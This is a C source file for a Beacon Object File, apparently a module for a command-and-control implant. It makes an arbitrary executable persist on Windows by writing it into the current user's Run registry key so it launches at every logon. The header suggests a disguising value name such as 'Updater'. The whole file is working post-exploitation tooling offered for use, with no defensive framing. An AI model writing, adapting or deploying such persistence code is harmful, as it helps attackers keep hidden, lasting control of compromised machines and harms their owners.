/*
 * BOF: Registry Run Key Persistence
 *
 * Writes a value to HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 * so the specified executable launches at user logon.
 *
 * Compile: x86_64-w64-mingw32-gcc -c registry_run.c -o registry_run.o
 *
 * Arguments (packed via BeaconDataParse):
 *   [wchar*] key_name  - registry value name (e.g. "Updater")
 *   [wchar*] exe_path  - full path to executable
 */

#include <windows.h>
#include "../bof_api.h"

DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegOpenKeyExW(HKEY, LPCWSTR, DWORD, REGSAM, PHKEY);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegSetValueExW(HKEY, LPCWSTR, DWORD, DWORD, const BYTE *, DWORD);
DECLSPEC_IMPORT LONG WINAPI ADVAPI32$RegCloseKey(HKEY);

DECLSPEC_IMPORT int WINAPI KERNEL32$lstrlenW(LPCWSTR);

static const wchar_t RUN_KEY[] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    wchar_t *key_name = (wchar_t *)BeaconDataExtract(&parser, NULL);
    wchar_t *exe_path = (wchar_t *)BeaconDataExtract(&parser, NULL);

    if (!key_name || !exe_path) {
        BeaconPrintf(CALLBACK_ERROR, "Usage: registry_run <key_name> <exe_path>");
        return;
    }

    HKEY hKey = NULL;
    LONG status = ADVAPI32$RegOpenKeyExW(
        HKEY_CURRENT_USER,
        RUN_KEY,
        0,
        KEY_SET_VALUE,
        &hKey
    );

    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegOpenKeyExW failed: %ld", status);
        return;
    }

    DWORD cbData = (DWORD)((KERNEL32$lstrlenW(exe_path) + 1) * sizeof(wchar_t));

    status = ADVAPI32$RegSetValueExW(
        hKey,
        key_name,
        0,
        REG_SZ,
        (const BYTE *)exe_path,
        cbData
    );

    if (status != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "RegSetValueExW failed: %ld", status);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Run key set:");
        BeaconPrintf(CALLBACK_OUTPUT, "    Key:   HKCU\\%S", RUN_KEY);
        BeaconPrintf(CALLBACK_OUTPUT, "    Name:  %S", key_name);
        BeaconPrintf(CALLBACK_OUTPUT, "    Value: %S", exe_path);
    }

    ADVAPI32$RegCloseKey(hKey);
}
